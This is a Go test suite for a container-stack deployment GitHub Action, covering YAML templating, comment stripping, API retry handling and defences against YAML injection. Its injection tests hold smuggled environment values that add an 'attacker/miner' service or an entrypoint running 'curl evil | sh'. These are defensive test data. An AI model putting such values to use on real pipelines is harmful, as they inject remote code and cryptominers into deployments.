package main

import (
	"context"
	"errors"
	"io"
	"maps"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/mittwald/api-client-go/mittwaldv2/generated/clients/containerclientv2"
	"github.com/mittwald/api-client-go/mittwaldv2/generated/schemas/containerv2"
	"github.com/stretchr/testify/suite"
	"gopkg.in/yaml.v3"
)

type StackActionTestSuite struct {
	suite.Suite
}

func (s *StackActionTestSuite) SetupTest() {
	os.Clearenv()
}

func (s *StackActionTestSuite) TestRenderConfigTemplate_EnvReplacement() {
	os.Setenv("FOO", "bar")

	out, err := renderConfigTemplate(`value: {{ .Env.FOO }}`)
	s.Require().NoError(err)

	s.Equal("value: bar", out.String())
}

func (s *StackActionTestSuite) TestLoadYamlOptional_WithTemplatingFromFile() {
	os.Setenv("FOO", "bar")

	content := `key: {{ .Env.FOO }}`
	tmpFile := s.writeTempFile("stack", content)
	os.Setenv("INPUT_STACK_FILE", tmpFile)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("bar", result["key"])
}

func (s *StackActionTestSuite) TestLoadYamlOptional_WithTemplatingFromInline() {
	os.Setenv("FOO", "bar")
	os.Setenv("INPUT_STACK_YAML", `key: {{ .Env.FOO }}`)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("bar", result["key"])
}

func (s *StackActionTestSuite) TestLoadYamlOptional_FailsWithBadTemplate() {
	os.Setenv("INPUT_STACK_YAML", `key: {{ .Env.`)

	_, err := loadYamlOptional("STACK")
	s.Error(err)
	s.Contains(err.Error(), "template")
}

func (s *StackActionTestSuite) TestMustEnv_Present() {
	os.Setenv("INPUT_API_TOKEN", "dummy-token")
	val := mustEnv("INPUT_API_TOKEN")
	s.Equal("dummy-token", val)
}

func (s *StackActionTestSuite) TestMustEnv_Missing() {
	defer func() {
		if r := recover(); r == nil {
			s.Fail("Expected os.Exit to be called")
		}
	}()
	mustEnv("MISSING_ENV_VAR")
}

func (s *StackActionTestSuite) TestLoadYamlOptional_FromEnv() {
	yamlStr := "key: value"
	os.Setenv("INPUT_STACK_YAML", yamlStr)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("value", result["key"])
}

func (s *StackActionTestSuite) TestLoadYamlOptional_Empty() {
	result, err := loadYamlOptional("NON_EXISTENT")
	s.NoError(err)
	s.Nil(result)
}

func (s *StackActionTestSuite) TestLoadYamlRequired_Present() {
	yamlStr := "key: value"
	os.Setenv("INPUT_SERVICES_YAML", yamlStr)

	result, err := loadYamlRequired("SERVICES")
	s.NoError(err)
	s.Equal("value", result["key"])
}

func (s *StackActionTestSuite) TestLoadYamlRequired_Missing() {
	_, err := loadYamlRequired("MISSING")
	s.Error(err)
	s.Contains(err.Error(), "unable to locate inputs")
}

func (s *StackActionTestSuite) TestParseStackObject_Valid() {
	data := map[string]interface{}{
		"services": map[string]interface{}{
			"app": map[string]interface{}{
				"image": "nginx",
			},
		},
	}
	result, err := parseStackObject(data)
	s.NoError(err)
	s.NotNil(result)
	s.Contains(result.Services, "app")
}

func (s *StackActionTestSuite) TestLoadStackData_WithStackYaml() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: test app
    ports:
      - "80/tcp"
volumes:
  data:
    name: app-volume
`,
	)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.Equal("nginx", *stack.Services["app"].Image)
	s.Equal("test app", *stack.Services["app"].Description)
	s.Contains(stack.Services["app"].Ports, "80/tcp")
	s.Contains(stack.Volumes, "data")
	s.Equal("app-volume", *stack.Volumes["data"].Name)

	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
	for _, vol := range stack.Volumes {
		s.NoError(vol.Validate())
	}
}

func (s *StackActionTestSuite) TestLoadStackData_WithServicesAndVolumesYaml() {
	os.Setenv(
		"INPUT_SERVICES_YAML", `
app:
  image: nginx
  description: test app
  ports:
    - "80/tcp"
`,
	)
	os.Setenv(
		"INPUT_VOLUMES_YAML", `
data:
  name: app-volume
`,
	)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.Equal("nginx", *stack.Services["app"].Image)
	s.Equal("test app", *stack.Services["app"].Description)
	s.Contains(stack.Services["app"].Ports, "80/tcp")
	s.Contains(stack.Volumes, "data")
	s.Equal("app-volume", *stack.Volumes["data"].Name)

	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
	for _, vol := range stack.Volumes {
		s.NoError(vol.Validate())
	}
}

func (s *StackActionTestSuite) writeTempFile(prefix, content string) string {
	tmpDir := s.T().TempDir()
	path := filepath.Join(tmpDir, prefix+".yaml")
	err := os.WriteFile(path, []byte(content), 0600)
	s.Require().NoError(err)
	return path
}

func (s *StackActionTestSuite) TestLoadStackData_FromStackFile() {
	content := `
services:
  app:
    image: nginx
    description: test app
    ports:
      - "80/tcp"
volumes:
  data:
    name: app-volume
`
	path := s.writeTempFile("stack", content)
	os.Setenv("INPUT_STACK_FILE", path)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.Equal("nginx", *stack.Services["app"].Image)
	s.Equal("test app", *stack.Services["app"].Description)
	s.Contains(stack.Services["app"].Ports, "80/tcp")
	s.Contains(stack.Volumes, "data")
	s.Equal("app-volume", *stack.Volumes["data"].Name)

	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
	for _, vol := range stack.Volumes {
		s.NoError(vol.Validate())
	}
}

func (s *StackActionTestSuite) TestLoadStackData_FromSeparateFiles() {
	serviceContent := `
app:
  image: nginx
  description: test app
  ports:
    - "80/tcp"
`
	volumeContent := `
data:
  name: app-volume
`
	servicesPath := s.writeTempFile("services", serviceContent)
	volumesPath := s.writeTempFile("volumes", volumeContent)

	os.Setenv("INPUT_SERVICES_FILE", servicesPath)
	os.Setenv("INPUT_VOLUMES_FILE", volumesPath)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.Equal("nginx", *stack.Services["app"].Image)
	s.Equal("test app", *stack.Services["app"].Description)
	s.Contains(stack.Services["app"].Ports, "80/tcp")
	s.Contains(stack.Volumes, "data")
	s.Equal("app-volume", *stack.Volumes["data"].Name)

	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
	for _, vol := range stack.Volumes {
		s.NoError(vol.Validate())
	}
}

func (s *StackActionTestSuite) TestLoadStackData_FromInvalidFile() {
	content := `invalid_yaml: [unterminated`
	path := s.writeTempFile("stack", content)
	os.Setenv("INPUT_STACK_FILE", path)

	_, err := loadStackData()
	s.Error(err)
	s.Contains(err.Error(), "unmarshal")
}

func (s *StackActionTestSuite) TestLoadStackData_AllowsMissingServiceDescription() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    ports:
      - "80/tcp"
`,
	)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.NotNil(stack.Services["app"].Description)
	s.Equal("app", *stack.Services["app"].Description)
	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
}

func (s *StackActionTestSuite) TestAddMissingStackData_FillsMissingServiceDescription() {
	stack, err := parseStackObject(map[string]interface{}{
		"services": map[string]interface{}{
			"app": map[string]interface{}{
				"image": "nginx",
			},
		},
	})
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.NotNil(stack.Services["app"].Description)
	s.Equal("app", *stack.Services["app"].Description)
	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
}

func (s *StackActionTestSuite) TestAddMissingStackData_EmptyServiceDescription() {
	stack, err := parseStackObject(map[string]interface{}{
		"services": map[string]interface{}{
			"app": map[string]interface{}{
				"image":       "nginx",
				"description": "",
			},
		},
	})
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	s.Contains(stack.Services, "app")
	s.NotNil(stack.Services["app"].Description)
	s.Equal("app", *stack.Services["app"].Description)
	for _, svc := range stack.Services {
		s.NoError(svc.Validate())
	}
}

func (s *StackActionTestSuite) TestLoadServicesToRecreate_EmptyList() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: test app
    ports:
      - "80/tcp"
volumes:
  data:
    name: app-volume
`,
	)

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	servicesToRecreate := loadServicesToRecreate(stack.Services)
	s.Len(servicesToRecreate, 1)
	_, found := servicesToRecreate["app"]
	s.True(found)
}

func (s *StackActionTestSuite) TestLoadServicesToRecreate_WithOneEntry() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: test app
    ports:
      - "80/tcp"
  db:
    image: mysql
    description: test mysql
    ports:
      - "3306/tcp"
`,
	)

	os.Setenv("INPUT_SKIP_RECREATION", "db")

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	servicesToRecreate := loadServicesToRecreate(stack.Services)
	s.Len(servicesToRecreate, 1)

	_, found := servicesToRecreate["app"]
	s.True(found)
}

func (s *StackActionTestSuite) TestLoadServicesToRecreate_WithMultipleEntries() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: test app
    ports:
      - "80/tcp"
  db:
    image: mysql
    description: test mysql
    ports:
      - "3306/tcp"
  redis:
    image: redis
    description: test redis
    ports:
      - "6379/tcp"
`,
	)

	os.Setenv("INPUT_SKIP_RECREATION", "db,redis")

	stack, err := loadStackData()
	s.NoError(err)
	s.NotNil(stack)

	stack = addMissingStackData(stack)

	servicesToRecreate := loadServicesToRecreate(stack.Services)
	s.Len(servicesToRecreate, 1)

	_, found := servicesToRecreate["app"]
	s.True(found)
}

func (s *StackActionTestSuite) serviceField(parsed map[string]interface{}, service, field string) interface{} {
	services, ok := parsed["services"].(map[string]interface{})
	s.Require().True(ok, "expected a services map")

	svc, ok := services[service].(map[string]interface{})
	s.Require().True(ok, "expected service %q", service)

	return svc[field]
}

// Regression tests for https://github.com/mittwald/deploy-container-action/issues/151.

func (s *StackActionTestSuite) TestLoadYamlOptional_IgnoresTemplateInFullLineComment() {
	os.Setenv(
		"INPUT_STACK_YAML", `
# db_url: {{ .Env.UNSET_VAR }}
services:
  app:
    image: nginx
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("nginx", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_IgnoresTemplateInTrailingComment() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx # was {{ .Env.UNSET_VAR }}
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("nginx", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_IgnoresBrokenTemplateSyntaxInComment() {
	os.Setenv(
		"INPUT_STACK_YAML", `
# see {{
services:
  app:
    image: nginx
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("nginx", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_KeepsHashInDoubleQuotedScalar() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: "web # 1" # a real comment
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("web # 1", s.serviceField(result, "app", "description"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_KeepsHashInSingleQuotedScalar() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    description: 'web # 1'
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("web # 1", s.serviceField(result, "app", "description"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_KeepsHashWithoutPrecedingWhitespace() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx#latest
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("nginx#latest", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_KeepsShebangInsideBlockScalar() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    command: |
      #!/bin/sh
      echo "hello # world"
    description: web # a real comment
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("#!/bin/sh\necho \"hello # world\"\n", s.serviceField(result, "app", "command"))
	s.Equal("web", s.serviceField(result, "app", "description"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_StripsCommentOnBlockScalarHeader() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: nginx
    command: | # {{ .Env.UNSET_VAR }}
      #!/bin/sh
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("#!/bin/sh\n", s.serviceField(result, "app", "command"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_StillRendersTemplateOutsideComments() {
	os.Setenv("MY_IMAGE", "nginx:1.27")
	os.Setenv(
		"INPUT_STACK_YAML", `
# image: {{ .Env.UNSET_VAR }}
services:
  app:
    image: {{ .Env.MY_IMAGE }}
`,
	)

	result, err := loadYamlOptional("STACK")
	s.NoError(err)
	s.Equal("nginx:1.27", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_StillFailsOnMissingEnvOutsideComment() {
	os.Setenv(
		"INPUT_STACK_YAML", `
services:
  app:
    image: {{ .Env.UNSET_VAR }}
`,
	)

	_, err := loadYamlOptional("STACK")
	s.Error(err)
	s.Contains(err.Error(), `map has no entry for key "UNSET_VAR"`)
}

func (s *StackActionTestSuite) TestStripYamlComments() {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{"full line comment", "# c {{ .Env.X }}\nkey: v\n", "\nkey: v\n"},
		{"trailing comment", "key: v # {{ .Env.X }}\n", "key: v \n"},
		{"indented comment", "a:\n  # c\n  b: 1\n", "a:\n  \n  b: 1\n"},
		{"hash without whitespace", "key: nginx#latest\n", "key: nginx#latest\n"},
		{"hash in double quotes", "key: \"a # b\" # real\n", "key: \"a # b\" \n"},
		{"hash in single quotes", "key: 'a # b'\n", "key: 'a # b'\n"},
		{"escaped single quote", "key: 'it''s # ok'\n", "key: 'it''s # ok'\n"},
		{
			"block scalar content",
			"cmd: |\n  #!/bin/sh\n  echo hi # keep\nnext: 1 # drop\n",
			"cmd: |\n  #!/bin/sh\n  echo hi # keep\nnext: 1 \n",
		},
		{"folded scalar with chomping", "cmd: >-\n  # keep\nnext: 1 # drop\n", "cmd: >-\n  # keep\nnext: 1 \n"},
		{"comment on block scalar header", "cmd: | # drop\n  # keep\n", "cmd: | \n  # keep\n"},
		{"blank line inside block scalar", "cmd: |\n  a\n\n  b\nnext: 1 # drop\n", "cmd: |\n  a\n\n  b\nnext: 1 \n"},
		{
			"nested block scalar",
			"s:\n  app:\n    cmd: |\n      # keep\n    img: n # drop\n",
			"s:\n  app:\n    cmd: |\n      # keep\n    img: n \n",
		},
		{
			"multiline double quoted scalar",
			"key: \"line one\n  # still string\"\nnext: 1 # drop\n",
			"key: \"line one\n  # still string\"\nnext: 1 \n",
		},
		{"template is untouched", "envs:\n  P: {{ .Env.P }} # note\n", "envs:\n  P: {{ .Env.P }} \n"},
	}

	for _, testCase := range testCases {
		s.Run(
			testCase.name, func() {
				s.Equal(testCase.expected, string(stripYamlComments([]byte(testCase.input))))
			},
		)
	}
}

func (s *StackActionTestSuite) TestStripYamlComments_PreservesLineCount() {
	input := "# one\nkey: v # two\n\n# three\n"
	s.Equal(
		strings.Count(input, "\n"),
		strings.Count(string(stripYamlComments([]byte(input))), "\n"),
	)
}

// Regression tests for https://github.com/mittwald/deploy-container-action/issues/153: a substituted
// value must not be able to change the structure of the stack definition.

// yamlInjection would add a service running an attacker image if it escaped its scalar.
const yamlInjection = "nginx\n  evil:\n    image: attacker/miner"

// assertRejectsLineBreak sets a single environment variable and expects the given template to be
// rejected because that variable's value would break out of its position in the YAML document.
func (s *StackActionTestSuite) assertRejectsLineBreak(envName, envValue, stackYaml string) {
	s.T().Helper()

	os.Setenv(envName, envValue)
	os.Setenv("INPUT_STACK_YAML", stackYaml)

	result, err := loadYamlOptional("STACK")
	s.Require().Error(err)
	s.Nil(result)
	s.Contains(err.Error(), `"`+envName+`"`)
	s.Contains(err.Error(), "line break")
	s.Contains(err.Error(), "quote")
	s.NotContains(err.Error(), "attacker", "the error must not echo the value")
}

func (s *StackActionTestSuite) TestLoadYamlOptional_RejectsLineBreakInEnvValue() {
	imageYaml := "services:\n  app:\n    image: {{ .Env.INJECTED }}\n"

	testCases := map[string]struct {
		envValue  string
		stackYaml string
	}{
		"value position": {yamlInjection, imageYaml},
		"quoted value position": {
			"v1\"\n    entrypoint: [\"/bin/sh\", \"-c\", \"curl evil | sh\"]\n    x: \"y",
			"services:\n  app:\n    image: nginx\n    envs:\n      VERSION: \"{{ .Env.INJECTED }}\"\n",
		},
		"block scalar": {
			"echo hi\n  evil:\n    image: attacker/miner",
			"services:\n  app:\n    image: nginx\n    command:\n      - |\n        {{ .Env.INJECTED }}\n",
		},
		"multi line value in quoted position": {
			"line one\nline two",
			"services:\n  app:\n    image: nginx\n    envs:\n      KEY: \"{{ .Env.INJECTED }}\"\n",
		},
		"carriage return line feed": {"nginx\r\n  evil:\r\n    image: attacker/miner", imageYaml},
		"lone carriage return":      {"nginx\r  evil:\r    image: attacker/miner", imageYaml},
		"trailing carriage return":  {"nginx\r", imageYaml},
		"next line":                 {"nginx\u0085  evil:\u0085    image: attacker/miner", imageYaml},
		"line separator":            {"nginx\u2028  evil:\u2028    image: attacker/miner", imageYaml},
		"paragraph separator":       {"nginx\u2029  evil:\u2029    image: attacker/miner", imageYaml},
		"index access": {
			yamlInjection,
			"services:\n  app:\n    image: {{ index .Env \"INJECTED\" }}\n",
		},
		"printf": {
			yamlInjection,
			"services:\n  app:\n    image: {{ printf \"%s\" .Env.INJECTED }}\n",
		},
		"html escaping": {
			yamlInjection,
			"services:\n  app:\n    image: {{ html .Env.INJECTED }}\n",
		},
		"range over env": {
			yamlInjection,
			"services:\n  app:\n    image: nginx\n    envs:\n{{ range $k, $v := .Env }}      {{ $k }}: {{ $v }}\n{{ end }}",
		},
		"quoted then raw": {
			yamlInjection,
			"services:\n  app:\n    image: nginx\n    envs:\n      A: {{ quote .Env.INJECTED }}\n      B: {{ .Env.INJECTED }}\n",
		},
	}

	for name, testCase := range testCases {
		s.Run(
			name, func() {
				os.Clearenv()
				s.assertRejectsLineBreak("INJECTED", testCase.envValue, testCase.stackYaml)
			},
		)
	}
}

func (s *StackActionTestSuite) TestLoadYamlOptional_AllowsUnreferencedMultiLineEnvValue() {
	os.Setenv("GITHUB_EVENT", "{\n  \"action\": \"opened\"\n}")
	os.Setenv("IMAGE", "nginx:1.27")
	os.Setenv("INPUT_STACK_YAML", "services:\n  app:\n    image: {{ .Env.IMAGE }}\n")

	result, err := loadYamlOptional("STACK")
	s.Require().NoError(err)
	s.Equal("nginx:1.27", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadYamlOptional_AllowsMultiLineEnvValueOutsideOutput() {
	os.Setenv("MODE", "off")
	os.Setenv("MULTI_LINE", "line one\nline two")
	os.Setenv(
		"INPUT_STACK_YAML",
		"# old: {{ .Env.MULTI_LINE }}\nservices:\n  app:\n"+
			"    image: {{ if eq .Env.MODE \"on\" }}{{ .Env.MULTI_LINE }}{{ else }}nginx{{ end }}\n",
	)

	result, err := loadYamlOptional("STACK")
	s.Require().NoError(err)
	s.Equal("nginx", s.serviceField(result, "app", "image"))
}

func (s *StackActionTestSuite) TestLoadStackData_QuoteKeepsValuesIntact() {
	values := map[string]string{
		"plain":               "nginx:1.27",
		"empty":               "",
		"comment marker":      "Tr0ub4dor #&3-long-secret",
		"mapping indicator":   "key: value",
		"double quotes":       `say "hi"`,
		"single quote":        "it's",
		"backslashes":         `C:\path\n\t`,
		"line feed":           yamlInjection,
		"carriage returns":    "a\r\nb\rc",
		"unicode line breaks": "a\u0085b\u2028c\u2029d",
		"tab":                 "a\tb",
		"control characters":  "a\x01b\x1bc\x7fd\u0090e",
		"byte order mark":     "a\ufeffb",
		"noncharacter":        "a\uffffb",
		"template syntax":     "{{ .Env.HOME }}",
		"surrounding spaces":  "  padded  ",
		"flow collection":     "[a, b] {c: d}",
		"alias and tag":       "*alias &anchor !!binary",
		"looks like null":     "null",
		"looks like number":   "0123",
		"non ascii":           "grüße 🚀",
	}

	for name, value := range values {
		s.Run(
			name, func() {
				os.Clearenv()
				os.Setenv("VALUE", value)
				os.Setenv(
					"INPUT_STACK_YAML",
					"services:\n  app:\n    image: nginx\n    envs:\n"+
						"      QUOTED: {{ quote .Env.VALUE }}\n      PIPED: {{ .Env.VALUE | quote }}\n",
				)

				stack, err := loadStackData()
				s.Require().NoError(err)
				s.Equal([]string{"app"}, slices.Collect(maps.Keys(stack.Services)))
				s.Equal(map[string]string{"QUOTED": value, "PIPED": value}, stack.Services["app"].Envs)
			},
		)
	}
}

func (s *StackActionTestSuite) TestLoadStackData_QuoteContainsInjectionAttempt() {
	os.Setenv("COMMIT_MSG", "fix typo\n    entrypoint: [\"/bin/sh\", \"-c\", \"curl evil | sh\"]\n"+yamlInjection)
	os.Setenv(
		"INPUT_STACK_YAML",
		"services:\n  app:\n    image: nginx\n    envs:\n      COMMIT_MSG: {{ quote .Env.COMMIT_MSG }}\n",
	)

	stack, err := loadStackData()
	s.Require().NoError(err)
	s.Len(stack.Services, 1)
	s.Nil(stack.Services["app"].Entrypoint)
	s.Equal(os.Getenv("COMMIT_MSG"), stack.Services["app"].Envs["COMMIT_MSG"])
}

func (s *StackActionTestSuite) TestRenderConfigTemplate_HidesRunnerCredentials() {
	for name := range hiddenTemplateEnv {
		s.Run(
			name, func() {
				os.Clearenv()
				os.Setenv(name, "dummy-credential")

				_, err := renderConfigTemplate("value: {{ .Env." + name + " }}")
				s.Require().Error(err)
				s.Contains(err.Error(), `map has no entry for key "`+name+`"`)
			},
		)
	}
}

func (s *StackActionTestSuite) TestRenderConfigTemplate_HidesApiTokenFromIndirectAccess() {
	os.Setenv("INPUT_API_TOKEN", "dummy-token")
	os.Setenv("VISIBLE", "yes")

	out, err := renderConfigTemplate(`{{ range $k, $v := .Env }}{{ $k }}={{ $v }};{{ end }}`)
	s.Require().NoError(err)
	s.Equal("VISIBLE=yes;", out.String())

	out, err = renderConfigTemplate(`T: {{ index .Env (printf "%s_%s" "INPUT_API" "TOKEN") }}`)
	s.Require().NoError(err) // index yields the zero value for a missing key
	s.NotContains(out.String(), "dummy-token")
}

func FuzzYamlQuote(f *testing.F) {
	for _, seed := range []string{
		"", "plain", "a #b", "a: b", `"`, `\`, `\"`, "'", "\n", "\r\n", "\u0085", "\u2028", "\u2029",
		"\t", "\x00", "\x7f", "\u0090", "\ufeff", "\ufffe", "{{ .Env.X }}", " lead", "trail ", "🚀",
	} {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, value string) {
		if !utf8.ValidString(value) {
			t.Skip("invalid UTF-8 is replaced by U+FFFD")
		}

		var parsed map[string]interface{}
		if err := yaml.Unmarshal([]byte("key: "+yamlQuote(value)+" # comment\nnext: 1\n"), &parsed); err != nil {
			t.Fatalf("quoted %q does not parse: %v", value, err)
		}

		if len(parsed) != 2 || parsed["key"] != value || parsed["next"] != 1 {
			t.Fatalf("quoted %q parsed as %#v", value, parsed)
		}
	})
}

// updateStackResult is one scripted answer of the fake stack updater.
type updateStackResult struct {
	response     *containerv2.StackResponse
	httpResponse *http.Response
	err          error
}

// fakeStackUpdater replays scripted results in order and repeats the last one afterwards.
type fakeStackUpdater struct {
	results []updateStackResult
	calls   int
	onCall  func()
}

func (f *fakeStackUpdater) UpdateStack(
	_ context.Context,
	_ containerclientv2.UpdateStackRequest,
	_ ...func(req *http.Request) error,
) (*containerv2.StackResponse, *http.Response, error) {
	index := f.calls
	if index >= len(f.results) {
		index = len(f.results) - 1
	}
	f.calls++

	if f.onCall != nil {
		f.onCall()
	}

	result := f.results[index]

	return result.response, result.httpResponse, result.err
}

func httpResponseWithStatus(status int) *http.Response {
	return &http.Response{StatusCode: status, Body: io.NopCloser(strings.NewReader(""))}
}

var (
	errDialTimeout        = errors.New("dial tcp: i/o timeout")
	errServiceUnavailable = errors.New("503")
	errTooManyRequests    = errors.New("429")
	errBadRequest         = errors.New("400")
	errBadGateway         = errors.New("502")
	errAboveHTTPRange     = errors.New("600")
	errBuildRequest       = errors.New("failed to marshal request body")
)

func transportError() error {
	return &url.Error{Op: "Patch", URL: "https://api.mittwald.de/v2/stacks/x", Err: errDialTimeout}
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_SucceedsAfterTransportErrors() {
	success := &containerv2.StackResponse{}
	fake := &fakeStackUpdater{results: []updateStackResult{
		{err: transportError()},
		{err: transportError()},
		{response: success, httpResponse: httpResponseWithStatus(http.StatusOK)},
	}}

	response, _, err := updateStackWithRetry(context.Background(), fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().NoError(err)
	s.Same(success, response)
	s.Equal(3, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_RetriesServerErrors() {
	fake := &fakeStackUpdater{results: []updateStackResult{
		{httpResponse: httpResponseWithStatus(http.StatusServiceUnavailable), err: errServiceUnavailable},
		{httpResponse: httpResponseWithStatus(http.StatusTooManyRequests), err: errTooManyRequests},
		{response: &containerv2.StackResponse{}, httpResponse: httpResponseWithStatus(http.StatusOK)},
	}}

	_, _, err := updateStackWithRetry(context.Background(), fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().NoError(err)
	s.Equal(3, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_DoesNotRetryClientErrors() {
	fake := &fakeStackUpdater{results: []updateStackResult{
		{httpResponse: httpResponseWithStatus(http.StatusBadRequest), err: errBadRequest},
	}}

	_, httpResponse, err := updateStackWithRetry(context.Background(), fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().ErrorIs(err, errBadRequest)
	s.Equal(http.StatusBadRequest, httpResponse.StatusCode) // response is kept for diagnostics
	s.Equal(1, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_DoesNotRetryRequestBuildErrors() {
	fake := &fakeStackUpdater{results: []updateStackResult{{err: errBuildRequest}}}

	_, httpResponse, err := updateStackWithRetry(context.Background(), fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().ErrorIs(err, errBuildRequest)
	s.Nil(httpResponse)
	s.Equal(1, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_GivesUpAfterMaxAttempts() {
	fake := &fakeStackUpdater{results: []updateStackResult{{err: transportError()}}}

	_, httpResponse, err := updateStackWithRetry(context.Background(), fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().Error(err)
	s.Nil(httpResponse) // nothing to dump — main must not dereference it
	s.Equal(updateStackMaxAttempts, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_StopsWhenContextIsCancelled() {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	fake := &fakeStackUpdater{results: []updateStackResult{{err: transportError()}}}

	_, httpResponse, err := updateStackWithRetry(ctx, fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().ErrorIs(err, context.Canceled)
	s.Nil(httpResponse)
	s.Equal(0, fake.calls)
}

func (s *StackActionTestSuite) TestUpdateStackWithRetry_ReportsCancellationDuringBackoff() {
	ctx, cancel := context.WithCancel(context.Background())
	fake := &fakeStackUpdater{results: []updateStackResult{{err: transportError()}}}
	fake.onCall = cancel // cancelled while the first attempt is in flight

	_, httpResponse, err := updateStackWithRetry(ctx, fake, containerclientv2.UpdateStackRequest{}, 0)

	s.Require().ErrorIs(err, context.Canceled)
	s.Contains(err.Error(), "i/o timeout") // the transient failure is kept as cause
	s.Nil(httpResponse)                    // its body was closed, nothing usable to return
	s.Equal(1, fake.calls)
}

func (s *StackActionTestSuite) TestIsTransientFailure_IgnoresStatusCodesAboveTheHTTPRange() {
	s.True(isTransientFailure(httpResponseWithStatus(http.StatusBadGateway), errBadGateway))
	s.False(isTransientFailure(httpResponseWithStatus(600), errAboveHTTPRange))
}

func TestStackActionTestSuite(t *testing.T) {
	suite.Run(t, new(StackActionTestSuite))
}
